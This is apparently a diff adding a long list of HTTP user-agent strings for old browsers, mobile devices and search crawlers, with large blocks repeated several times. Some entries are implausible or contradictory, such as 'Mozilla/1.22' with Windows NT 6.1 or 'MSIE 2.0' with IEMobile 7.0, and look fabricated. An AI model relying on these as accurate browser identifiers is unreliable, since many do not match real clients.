+@Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51
+@Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)
+@Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)
+@Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7
+@BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0
+@Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)
+@Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)
+@Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)
+@Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)
+@Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10
+@Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)
+@Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007
+@BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179
+@Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620
+@Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com
+@Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)
+@Mozilla/4.0 (compatible; Arachmo)
+@Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)
+@Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)
+@Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)
+@Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)
+@BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)
+@Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
+@Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)
+@Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)
+@Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)
+@Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )
+@Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )
+@Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)
+@Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)
+@Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)
+@Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)
+@Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)
+@Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)
+@Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)
+@Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)
+@Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA
+@Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2
+@Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1
+@Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)
+@Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A
+@Mozilla/5.0 (PLAYSTATION 3; 3.55)
+@Mozilla/5.0 (PLAYSTATION 3; 2.00)
+@Mozilla/5.0 (PLAYSTATION 3; 1.00)
+@Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0
+@Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)
+@SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)
+@iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)
+@iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)
+@Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)
+@Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)
+@Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) 
+@Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)
+@Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1
+@Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
+@Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)
+@Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})
+@Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none; freenet DSL 1.1; (none))
+@Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)
+@Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51
+@Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1
+@Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)
+@Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie; .NET CLR 1.1.4322)
+@Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8
+@Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010 Firefox/1.0.7 (Ubuntu package 1.0.7)
+@Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3
+@Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)
+@Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)
+@Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1
+@Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1
+@Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)
+@Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)
+@Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)
+@Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)
+@Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)
+@Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)
+@Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51
+@Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3
+@Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)
+@Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)
+@Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)
+@Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E
+@Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1
+@Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)
+@Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15
+@Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57
+@Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413
+@Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)
+@Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)
+@Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0
+@Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g
+@Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)
+@Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125
+@Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)
+@Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413
+@Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)
+@Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)
+@Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)
+@Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)
+@Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)
+@Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)
+@Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10
+@Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4
+@Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0
+@Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10
+@Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)
+@Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
+@Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)
+@Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)
+@Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16
+@Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1
+@Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)
+@Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51
+@Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)
+@Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)
+@Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7
+@BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0
+@Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)
+@Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)
+@Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)
+@Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)
+@Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10
+@Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)
+@Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007
+@BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179
+@Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)
+@Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)
+@Googlebot/2.1 (http://www.googlebot.com/bot.html)
+@Opera/9.20 (Windows NT 6.0; U; en)
+@Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)
+@Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)
+@Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0
+@Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16
+@Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)
+@Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13
+@Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)
+@Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)
+@Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)
+@Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)
+@Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)
+@Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8
+@Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7
+@Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+@Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)
+@YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)
+@Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3
+@Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)
+@Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)
+@Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1
+@Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1
+@Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)
+@Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)
+@Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)
+@Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)
+@Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)
+@Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)
+@Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51
+@AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)
+@Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)
+@Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
+@Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)
+@Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
+@Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)
+@Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)
+@Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3
+@Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)
+@Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)
+@Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)
+@Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E
+@Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1
+@Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)
+@Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15
+@Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57
+@Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413
+@Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)
+@Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)
+@Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0
+@Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g
+@Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)
+@Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125
+@Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)
+@Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413
+@Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)
+@Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)
+@Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)
+@Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)
+@Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)
+@Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)
+@Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10
+@Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4
+@Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0
+@Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10
+@Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)
+@Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
+@Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)
+@Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)
+@Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16
+@Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1
+@Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)
+@Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51
+@Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)
+@Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)
+@Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7
+@BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0
+@Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)
+@Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)
+@Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)
+@Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)
+@Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10
+@Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)
+@Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007
+@BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179
+@Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3
+@Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)
+@Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)
+@Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)
+@Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E
+@Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1
+@Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)
+@Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15
+@Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57
+@Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413
+@Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)
+@Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)
+@Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0
+@Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g
+@Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)
+@Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125
+@Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)
+@Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413
+@Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)
+@Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)
+@Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)
+@Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)
